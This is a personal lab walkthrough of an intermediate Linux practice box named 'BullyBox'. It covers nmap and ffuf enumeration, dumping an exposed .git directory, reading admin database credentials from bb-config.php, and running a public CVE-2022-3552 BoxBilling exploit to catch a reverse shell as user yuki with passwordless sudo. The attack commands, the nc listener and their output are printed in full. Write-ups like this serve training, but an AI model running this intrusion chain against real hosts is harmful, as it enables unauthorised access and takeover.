
## Lab Details
- Difficulty: Intermediate
- OS: Linux 
- Foothold time: 1 hour and 10 minutes 
- Privesc time: 
- Total solve time: 1 hour and 10 minutes 

## Summary
- Initial access: Authenticated RCE on `Boxbilling` CVE-2022-3552
- Privilege escalation: Excessive Sudo privilege 

## Enumeration
- Key findings: Found `Boxbilling` hosted port 80
##### Steps
- run `nmap`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-git:
|   192.168.58.27:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Ready For launch
| http-robots.txt: 8 disallowed entries
| /boxbilling/bb-data/ /bb-data/ /bb-library/
|_/bb-locale/ /bb-modules/ /bb-uploads/ /bb-vendor/ /install/
|_http-title: Client Area
```
## Foothold
- Path: Identified `.git` directory on the web application, fetch `.git` using `git-dumper` and discovered user credential which then provided as input for the authenticated RCE
- Key commands: `git-dumper` 

##### Steps
- Run `ffuf` against the hostname, discovered `.git`
- However unable able to visit the `.git` directory via browser as an unauthorized user 
```
 
ffuf -u http://bullybox.local/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bullybox.local/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

index.php               [Status: 200, Size: 10462, Words: 3564, Lines: 265, Duration: 23ms]
robots.txt              [Status: 200, Size: 716, Words: 77, Lines: 21, Duration: 111ms]
sitemap.xml             [Status: 200, Size: 1719, Words: 295, Lines: 54, Duration: 155ms]
.                       [Status: 200, Size: 10462, Words: 3564, Lines: 265, Duration: 160ms]
2.0                     [Status: 200, Size: 3971, Words: 1588, Lines: 4, Duration: 122ms]
1.0                     [Status: 200, Size: 3971, Words: 1588, Lines: 4, Duration: 121ms]
4.0                     [Status: 200, Size: 3971, Words: 1588, Lines: 4, Duration: 103ms]
.git                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: <SNIP>

```
- download and run `git-dumper` against the target and save the `.git` locally
```
$ git-dumper http://bullybox.local/.git ~/bullybox
[-] Testing http://bullybox.local/.git/HEAD [200]
[-] Testing http://bullybox.local/.git/ [403]
[-] Fetching common files
[-] Fetching http://bullybox.local/.git/COMMIT_EDITMSG [200]
<SNIP>
```
- enumerate the downloaded directory and found `bb-config.php` containing admin credential
```
$ cat ./bb-config.php
<?php
return array (
  'debug' => false,
  'salt' => 'b94ff361990c5a8a37486ffe13fabc96',
  'url' => 'http://bullybox.local/',
  'admin_area_prefix' => '/bb-admin',
  'sef_urls' => true,
  'timezone' => 'UTC',
  'locale' => 'en_US',
  'locale_date_format' => '%A, %d %B %G',
  'locale_time_format' => ' %T',
  'path_data' => '/var/www/bullybox/bb-data',
  'path_logs' => '/var/www/bullybox/bb-data/log/application.log',
  'log_to_db' => true,
  'db' =>
  array (
    'type' => 'mysql',
    'host' => 'localhost',
    'name' => 'boxbilling',
    'user' => 'admin',
    'password' => 'Playing-Unstylish7-Provided',
```
- however valid login username was not found in the same file
- run `git log` and found the email address that used to commit changes
```
 git log
commit ccf7c701c4bd22484cbe5d9f8f92511261aadef0 (HEAD -> master)
Author: Yuki <admin@bullybox.local>
Date:   Tue Jun 27 04:35:12 2023 +0000

    Ready For launch
```
- search online and found POC https://github.com/BakalMode/CVE-2022-3552
- follow the instruction and a reverse shell can be obtained as user `Yuki`
	- **NOTE**: Change the local host IP address and local host port number in the exploit script
```
$ python3 ./CVE-2022-3552.py -d http://bullybox.local -u admin@bullybox.local -p Playing-Unstylish7-Provided

[+] Successfully logged in
[+] Payload saved successfully
[+] Getting Shell
```
- reverse shell received on local listener
```
$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.238] from (UNKNOWN) [192.168.108.27] 37136
Linux bullybox 5.15.0-75-generic #82-Ubuntu SMP Tue Jun 6 23:10:23 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 22:23:31 up 17 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)
/bin/sh: 0: can't access tty; job control turned off
```
- check `sudo -l`, `yuki` is able to run all commands as root without password
```
yuki@bullybox:/$ sudo -l
Matching Defaults entries for yuki on bullybox:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User yuki may run the following commands on bullybox:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```
## Lateral Movement 
- Path:
- Key commands:
##### Steps

## Privilege Escalation
- Path:
- Key commands:
##### Steps

## Lessons Learned
- Attack family:
- Key takeaway: 
	- `nmap target_ip -sC -sV -A -p-` for more comprehensive scan
	- Use case for `git dumper`
##### Steps

## Resources
- References: